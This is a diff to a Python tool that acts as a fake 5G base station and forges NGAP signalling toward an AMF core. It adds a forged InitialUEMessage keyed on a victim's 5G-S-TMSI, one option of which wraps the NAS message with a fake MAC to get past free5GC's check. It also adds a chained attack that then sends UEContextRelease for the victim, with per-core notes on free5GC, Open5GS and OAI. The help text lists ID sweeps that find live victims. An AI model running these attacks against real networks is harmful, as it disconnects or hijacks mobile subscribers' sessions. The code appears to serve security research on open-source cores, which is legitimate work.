@@ -1,5 +1,8 @@
 """CLI: pick which NGAP packet to send as a subcommand.
 
+  sctp-ping                         open ONLY the SCTP association (no NGAP) to
+                                    check L4 reachability + show the source IP the
+                                    AMF sees (isolates network vs NGAP problems)
   ng-setup                          connect + NG Setup (connectivity milestone)
   ue-release  --amf-ue-id N         forge UE CONTEXT RELEASE REQUEST for a victim
   error-indication --amf-ue-id N    forge ERROR INDICATION for a victim
@@ -9,6 +12,8 @@
   handover-required --amf-ue-id N   forge HANDOVER REQUIRED (relocation/DoS)
   ho-window-inject --amf-ue-id N    open N2 HO window (Required→self as target),
                                     Ack HandoverRequest, inject p21 and/or p09
+  chain-ps-release ...                 Path Switch THEN UEContextRelease (same SCTP)
+  chain-initue-release ...             InitialUE (5G-S-TMSI) THEN UEContextRelease
   sweep --attack X --amf-range LO-HI   enumerate AMF-UE-NGAP-ID (finds live victims)
 
 Every command (except ng-setup) performs NG Setup first. Victim identifiers:
@@ -110,6 +115,33 @@ def cmd_ng_reset(gnb, a):
         pairs.append((int(bits[0]), int(bits[1]) if len(bits) > 1 else None))
     r = gnb.send(B.ng_reset_partial(pairs))
     print(f"[ng-reset] targets={pairs} -> {ngap.summarize(r) if r else '(no reply)'}")
+
+
+def cmd_initial_ue(gnb, a):
+    """Forge InitialUEMessage keyed by victim 5G-S-TMSI (binding-steal probe).
+
+    Compares against Path Switch: does NOT take Source AMF-UE-NGAP-ID; allocates a
+    new RanUe/AmfUeNgapId path. On free5GC CM-CONNECTED the victim serving binding
+    is typically NOT stolen (NewAmfUe empty). On Open5GS associate may move NG.
+    """
+    tmsi = a.tmsi
+    nas_pdu = _build_initue_nas(a)
+    print(f"[initial-ue] ran-ue-id={a.ran_ue_id} "
+          f"5G-S-TMSI set={a.amf_set_id:#x} ptr={a.amf_pointer:#x} tmsi={tmsi} "
+          f"nas={nas_pdu.hex() if nas_pdu else 'default'}")
+    r = gnb.send(B.initial_ue_message(
+        a.ran_ue_id, gnb.cfg,
+        amf_set_id=a.amf_set_id, amf_pointer=a.amf_pointer, tmsi=tmsi,
+        nas_pdu=nas_pdu,
+        ue_context_request=not getattr(a, "no_ue_ctx_req", False)),
+        wait=True)
+    print(f"[initial-ue] reply: {ngap.summarize(r) if r else '(no reply / Class-2)'}")
+    _save(a.evidence, {"attack": "initial-ue",
+                       "ran_ue_id": a.ran_ue_id,
+                       "amf_set_id": a.amf_set_id,
+                       "amf_pointer": a.amf_pointer,
+                       "tmsi": tmsi,
+                       "reply": ngap.message_type(r) if r else None})
 
 
 def cmd_path_switch(gnb, a):
@@ -384,6 +416,236 @@ def cmd_gtpu_sink(a):
                        duration=a.duration, evidence=a.evidence)
 
 
+def cmd_sctp_ping(cfg):
+    """Layer-4 reachability probe: open ONLY the SCTP association to the AMF (no
+    NGAP, no NG Setup) and report the source IP the AMF sees.
+
+    Isolates network problems from NGAP/provisioning problems:
+      - FAIL here  => routing / firewall / SCTP-through-NAT issue. On Windows this
+        is almost always because traffic is NAT'd (WinNAT does NOT pass SCTP, and
+        Docker Desktop host-networking is TCP/UDP-only). Run inside a WSL2 distro
+        with mirrored networking so the AMF is reached over the host NIC directly.
+      - OK here but NG Setup still REJECTED => the SCTP path is fine; it's an NGAP
+        mismatch (PLMN/TAC/NSSAI/gNB-id) or the source IP is not whitelisted.
+    """
+    from .sctp_conn import SctpNgap
+    dst = cfg["amf_addr"]
+    port = int(cfg.get("amf_port", 38412))
+    if dst in (None, "", "REPLACE_ME"):
+        print("[sctp-ping] amf_addr is not set — edit the config or pass --amf-addr")
+        sys.exit(2)
+    print(f"[sctp-ping] opening SCTP association to AMF {dst}:{port} "
+          f"(bind_ip={cfg.get('bind_ip') or 'auto'}) ...")
+    conn = SctpNgap(dst, port, cfg.get("bind_ip"),
+                    timeout=float(cfg.get("timeout", 5.0)))
+    try:
+        conn.connect()
+    except Exception as e:
+        print(f"[sctp-ping] FAILED: {e!r}")
+        print("  -> SCTP association could NOT be established. Check, in order:")
+        print("     1) Is traffic being NAT'd? WinNAT / Docker Desktop do NOT pass")
+        print("        SCTP. Run this inside a WSL2 distro with mirrored networking")
+        print("        (see the deploy guide), NOT via Docker Desktop.")
+        print(f"     2) Can the host reach the AMF at all?  ping {dst}")
+        print(f"     3) AMF/firewall SCTP :{port} open, and this source IP allowed.")
+        sys.exit(1)
+    try:
+        src_ip, src_port = conn.sk.getsockname()[:2]
+        print("[sctp-ping] SUCCESS — SCTP association established.")
+        print(f"  source endpoint the AMF sees: {src_ip}:{src_port}")
+        print("  -> Layer-4 path is OK. If NG Setup is REJECTED next, it's an NGAP")
+        print("     mismatch (PLMN/TAC/NSSAI/gNB-id) or a non-whitelisted source IP,")
+        print("     NOT the network. Ask the AMF operator to allow the IP above.")
+    finally:
+        conn.close()
+
+
+def _build_initue_nas(a) -> bytes | None:
+    """Resolve NAS-PDU for InitialUE / chain-initue-release.
+
+    Priority: --nas-hex > --nas-integrity (fake MAC wrapper) > builder default
+    (structurally complete plain Service Request).
+    """
+    if getattr(a, "nas_hex", None):
+        return bytes.fromhex(a.nas_hex)
+    if getattr(a, "nas_integrity", False):
+        return B.service_request_nas_integrity_protected(
+            a.amf_set_id, a.amf_pointer, a.tmsi)
+    return None  # builders.initial_ue_message uses full plain Service Request
+
+
+def _await_ue_context_release_command(gnb, wait_s: float):
+    """Poll the association for UEContextReleaseCommand; return decoded PDU or None."""
+    gnb.conn.sk.settimeout(1.0)
+    deadline = time.monotonic() + float(wait_s)
+    while time.monotonic() < deadline:
+        try:
+            raw = gnb.conn.recv()
+        except (OSError, socket.timeout):
+            continue
+        if not raw:
+            continue
+        try:
+            pdu = ngap.decode(raw)
+        except Exception:
+            continue
+        mt = ngap.message_type(pdu)
+        if mt == "UEContextReleaseCommand":
+            return pdu
+        print(f"[chain] ignoring unexpected DL {mt}")
+    return None
+
+
+def cmd_chain_initue_release(gnb, a):
+    """CHAIN: InitialUEMessage (victim 5G-S-TMSI) THEN UEContextReleaseRequest.
+
+    Contrast with chain-ps-release (which KEEDS the victim AmfUeNgapId via Path
+    Switch rebind). InitialUE always opens a *new* RanUe on the attacker TNLA and
+    resolves the AmfUe by FiveG-S-TMSI:
+
+      free5GC CM-CONNECTED : NewAmfUe("") — victim serving NOT stolen; learned AU
+                             (if any) is an empty attacker-local context.
+      Open5GS              : Holding NG + associate — serving may soft-rebind; new
+                             AMF_UE_NGAP_ID allocated on the attacker ran_ue.
+      OAI                  : GUTI hit updates nas_context IDs; DL often carries the
+                             new AU back to the requester.
+
+    Release targets (same association, same --ran-ue-id):
+      victim  : --victim-amf-ue-id (pre-attack serving AU) — expect REJECT if
+                binding never moved / old AU still on legit gNB.
+      learned : AU observed in DL after InitialUE — expect ACCEPT if that AU now
+                lives on the attacker Ran (Open5GS/OAI soft-rebind path).
+      both    : try victim then learned (default when victim id is given).
+
+    Must share ONE SCTP association so any soft-rebind and the follow-up Release
+    see the same `ran` / gnb_id. Completes the Release Command handshake when
+    Command arrives (optional PDU list for SMF deactivate paths).
+    """
+    sessions = parse_sessions(a.pdu_sessions)
+    ran_ue_id = a.ran_ue_id
+    victim_au = getattr(a, "victim_amf_ue_id", None)
+    target_mode = getattr(a, "release_target", None) or (
+        "both" if victim_au is not None else "learned")
+    listen_s = float(getattr(a, "initue_listen", 3.0))
+    gap = float(getattr(a, "gap", 0.5))
+    release_wait = float(getattr(a, "release_wait", 5.0))
+
+    nas_pdu = _build_initue_nas(a)
+    print(f"[chain-initue] step1 InitialUEMessage ran-ue-id={ran_ue_id} "
+          f"5G-S-TMSI set={a.amf_set_id:#x} ptr={a.amf_pointer:#x} tmsi={a.tmsi}")
+    if nas_pdu is not None:
+        print(f"[chain-initue]   NAS-PDU ({len(nas_pdu)}B)={nas_pdu.hex()}")
+    else:
+        preview = B.service_request_nas(a.amf_set_id, a.amf_pointer, a.tmsi)
+        print(f"[chain-initue]   NAS-PDU default plain SR ({len(preview)}B)="
+              f"{preview.hex()}")
+    gnb.send(B.initial_ue_message(
+        ran_ue_id, gnb.cfg,
+        amf_set_id=a.amf_set_id, amf_pointer=a.amf_pointer, tmsi=a.tmsi,
+        nas_pdu=nas_pdu,
+        ue_context_request=not getattr(a, "no_ue_ctx_req", False)),
+        wait=False)
+    _save(a.evidence, {"attack": "chain-initue-release", "step": "initial-ue",
+                       "ran_ue_id": ran_ue_id,
+                       "amf_set_id": a.amf_set_id, "amf_pointer": a.amf_pointer,
+                       "tmsi": a.tmsi, "victim_amf_ue_id": victim_au,
+                       "nas_hex": (nas_pdu or B.service_request_nas(
+                           a.amf_set_id, a.amf_pointer, a.tmsi)).hex(),
+                       "nas_integrity": bool(getattr(a, "nas_integrity", False))})
+
+    print(f"[chain-initue] step1b listening {listen_s}s for DL carrying new AU ...")
+    learned_au = None
+    learned_ran = None
+    seen_dl = []
+
+    def on_dl(pdu):
+        nonlocal learned_au, learned_ran
+        mt = ngap.message_type(pdu)
+        seen_dl.append(mt)
+        info = decode.downlink_nas_info(pdu) if mt == "DownlinkNASTransport" \
+            else decode.ue_ngap_ids(pdu)
+        if not info:
+            print(f"[chain-initue]   DL {mt} (no UE NGAP IDs)")
+            return
+        nas = info.get("nas") or {}
+        extra = ""
+        if nas:
+            extra = (f" NAS={nas.get('message')} "
+                     f"cause={nas.get('gmm_cause_name')}(0x{nas.get('gmm_cause', 0):02x})")
+        print(f"[chain-initue]   DL {mt} AU={info.get('amf_ue_ngap_id')} "
+              f"RU={info.get('ran_ue_ngap_id')}{extra}")
+        if info.get("amf_ue_ngap_id") is not None:
+            learned_au = int(info["amf_ue_ngap_id"])
+        if info.get("ran_ue_ngap_id") is not None:
+            learned_ran = int(info["ran_ue_ngap_id"])
+        _save(a.evidence, {"attack": "chain-initue-release", "step": "dl-after-initue",
+                           **info})
+
+    gnb.listen(listen_s, on_dl)
+    print(f"[chain-initue] learned AU={learned_au} RU={learned_ran} "
+          f"dl_msgs={seen_dl or ['(none)']}")
+
+    # Build ordered release targets: (label, amf_ue_id, ran_ue_id)
+    targets = []
+    if target_mode in ("victim", "both"):
+        if victim_au is None:
+            print("[chain-initue] WARN: --release-target needs --victim-amf-ue-id "
+                  "for 'victim'/'both'; skipping victim target")
+        else:
+            targets.append(("victim", int(victim_au), ran_ue_id))
+    if target_mode in ("learned", "both"):
+        if learned_au is None:
+            print("[chain-initue] WARN: no AU learned from DL after InitialUE; "
+                  "skipping 'learned' target (Class-2 may yield no DL)")
+        else:
+            # Prefer AMF-returned RAN-UE-ID when present (OAI may echo it);
+            # else keep attacker-chosen ran_ue_id used in InitialUE.
+            ru = learned_ran if learned_ran is not None else ran_ue_id
+            targets.append(("learned", int(learned_au), int(ru)))
+    if not targets:
+        print("[chain-initue] ABORT: no release targets (give --victim-amf-ue-id "
+              "and/or wait for DL that exposes a new AU)")
+        _save(a.evidence, {"attack": "chain-initue-release", "step": "abort",
+                           "reason": "no-targets", "dl_msgs": seen_dl})
+        return
+
+    for label, au, ru in targets:
+        time.sleep(gap)
+        print(f"[chain-initue] step2 release target={label} AU={au} RU={ru} "
+              f"pdu={sessions} (same association)")
+        gnb.send(B.ue_context_release_request(au, ru, pdu_sessions=sessions),
+                 wait=False)
+        _save(a.evidence, {"attack": "chain-initue-release", "step": "ue-release",
+                           "target": label, "amf_ue_ngap_id": au, "ran_ue_id": ru,
+                           "pdu_sessions": list(sessions)})
+        print(f"[chain-initue] step3 waiting for UEContextReleaseCommand "
+              f"(target={label}) ...")
+        cmd = _await_ue_context_release_command(gnb, release_wait)
+        if not cmd:
+            print(f"[chain-initue] step3 NO Command for target={label} "
+                  f"(rejected / ErrorIndication / silent)")
+            _save(a.evidence, {"attack": "chain-initue-release",
+                               "step": "release-command", "target": label,
+                               "result": None})
+            continue
+        cmd_ids = decode.ue_ngap_ids(cmd)
+        print(f"[chain-initue] step3 got Command for target={label} "
+              f"AU={cmd_ids.get('amf_ue_ngap_id')} RU={cmd_ids.get('ran_ue_ngap_id')} "
+              f"-> sending Complete")
+        _save(a.evidence, {"attack": "chain-initue-release",
+                           "step": "release-command", "target": label,
+                           "result": "UEContextReleaseCommand", **cmd_ids})
+        gnb.send(B.ue_context_release_complete(au, ru, pdu_sessions=sessions),
+                 wait=False)
+        _save(a.evidence, {"attack": "chain-initue-release",
+                           "step": "release-complete", "target": label,
+                           "amf_ue_ngap_id": au, "ran_ue_id": ru,
+                           "pdu_sessions": list(sessions)})
+
+    print("[chain-initue] done — compare victim ping / AMF logs: "
+          "standalone reject vs initue-then-release")
+
+
 def cmd_chain_ps_release(gnb, a):
     """CHAIN: Path Switch THEN UEContextReleaseRequest on the SAME SCTP association.
 
@@ -437,24 +699,7 @@ def cmd_chain_ps_release(gnb, a):
 
     # step 3 -- wait for UEContextReleaseCommand and complete the handshake
     print("[chain] step3 waiting for UEContextReleaseCommand ...")
-    gnb.conn.sk.settimeout(1.0)
-    cmd = None
-    deadline = time.monotonic() + float(getattr(a, "release_wait", 5.0))
-    while time.monotonic() < deadline:
-        try:
-            raw = gnb.conn.recv()
-        except (OSError, socket.timeout):
-            continue
-        if not raw:
-            continue
-        try:
-            pdu = ngap.decode(raw)
-        except Exception:
-            continue
-        if ngap.message_type(pdu) == "UEContextReleaseCommand":
-            cmd = pdu
-            break
-        print(f"[chain] step3 ignoring unexpected {ngap.message_type(pdu)}")
+    cmd = _await_ue_context_release_command(gnb, float(getattr(a, "release_wait", 5.0)))
     if not cmd:
         print("[chain] step3 NO UEContextReleaseCommand — idle/Buff path likely incomplete")
         _save(a.evidence, {"attack": "chain-ps-release", "step": "release-command",
@@ -498,6 +743,7 @@ def main():
     sub = p.add_subparsers(dest="cmd", required=True)
 
     sub.add_parser("ng-setup")
+    sub.add_parser("sctp-ping")  # L4-only reachability probe (no NGAP/NG Setup)
 
     s = sub.add_parser("ue-release")
     s.add_argument("--amf-ue-id", type=int, required=True)
@@ -523,7 +769,25 @@ def main():
                    help="override asserted UESecurityCapabilities as 'nea,nia' "
                         "(16-bit hex, MSB=algo0); default NEA0/NIA0 (0x8000)")
 
+    s = sub.add_parser("initial-ue")
+    s.add_argument("--ran-ue-id", type=int, default=99,
+                   help="attacker-chosen local RAN-UE-NGAP-ID (new NG context)")
+    s.add_argument("--amf-set-id", type=lambda x: int(x, 0), required=True,
+                   help="AMF Set ID (10-bit) from victim 5G-S-TMSI / GUTI")
+    s.add_argument("--amf-pointer", type=lambda x: int(x, 0), default=0,
+                   help="AMF Pointer (6-bit)")
+    s.add_argument("--tmsi", required=True,
+                   help="victim 5G-TMSI as 8-hex or decimal")
+    s.add_argument("--nas-hex", default=None,
+                   help="override NAS-PDU hex (default: full plain Service Request)")
+    s.add_argument("--nas-integrity", action="store_true",
+                   help="wrap Service Request as integrity-protected with fake MAC "
+                        "(sec-hdr=1); needed to pass free5GC header check")
+    s.add_argument("--no-ue-ctx-req", action="store_true",
+                   help="omit UEContextRequest IE")
+
     s = sub.add_parser("chain-ps-release")
+
     s.add_argument("--source-amf-ue-id", type=int, required=True,
                    help="victim's Source AMF-UE-NGAP-ID")
     s.add_argument("--ran-ue-id", type=int, default=99,
@@ -539,6 +803,37 @@ def main():
     s.add_argument("--listen", type=float, default=0.0,
                    help="after Complete, seconds to listen for PAGING "
                         "(0 = exit after handshake)")
+
+    s = sub.add_parser("chain-initue-release",
+                       help="InitialUE (5G-S-TMSI) THEN UEContextRelease on one SCTP")
+    s.add_argument("--ran-ue-id", type=int, default=99,
+                   help="attacker-chosen RAN-UE-NGAP-ID for InitialUE + Release")
+    s.add_argument("--amf-set-id", type=lambda x: int(x, 0), required=True,
+                   help="AMF Set ID (10-bit) from victim 5G-S-TMSI / GUTI")
+    s.add_argument("--amf-pointer", type=lambda x: int(x, 0), default=0,
+                   help="AMF Pointer (6-bit)")
+    s.add_argument("--tmsi", required=True,
+                   help="victim 5G-TMSI as 8-hex or decimal")
+    s.add_argument("--victim-amf-ue-id", type=int, default=None,
+                   help="pre-attack serving AMF-UE-NGAP-ID (for victim-target release)")
+    s.add_argument("--release-target", choices=("victim", "learned", "both"),
+                   default=None,
+                   help="which AU to release after InitialUE "
+                        "(default: both if --victim-amf-ue-id else learned)")
+    s.add_argument("--nas-hex", default=None,
+                   help="override NAS-PDU hex (default: full plain Service Request)")
+    s.add_argument("--nas-integrity", action="store_true",
+                   help="wrap Service Request as integrity-protected with fake MAC")
+    s.add_argument("--no-ue-ctx-req", action="store_true",
+                   help="omit UEContextRequest IE on InitialUE")
+    s.add_argument("--pdu-sessions", default="1",
+                   help="PDU session ids on Release Request/Complete")
+    s.add_argument("--initue-listen", type=float, default=3.0,
+                   help="seconds to listen for DL exposing the new AU after InitialUE")
+    s.add_argument("--gap", type=float, default=0.5,
+                   help="seconds between InitialUE listen and each Release")
+    s.add_argument("--release-wait", type=float, default=5.0,
+                   help="seconds to wait for UEContextReleaseCommand per target")
 
     s = sub.add_parser("gtpu-sink")
     s.add_argument("--bind-ip", default="0.0.0.0")
@@ -612,6 +907,11 @@ def main():
 
     cfg = load_cfg(args.config, {"amf_addr": args.amf_addr, "amf_port": args.amf_port})
 
+    # sctp-ping is a pure L4 probe: establish the SCTP association only, no NGAP.
+    if args.cmd == "sctp-ping":
+        cmd_sctp_ping(cfg)
+        return
+
     gnb = FakeGNB(cfg)
     gnb.connect()
     print(f"[SCTP] connected to AMF {cfg['amf_addr']}:{cfg.get('amf_port', 38412)}")
@@ -644,6 +944,8 @@ def main():
      "ran-config-update": cmd_ran_config_update,
      "ul-ran-config-transfer": cmd_ul_ran_config_transfer,
      "chain-ps-release": cmd_chain_ps_release,
+     "chain-initue-release": cmd_chain_initue_release,
+     "initial-ue": cmd_initial_ue,
      "sweep": cmd_sweep}[args.cmd](gnb, args)
     gnb.close()
 
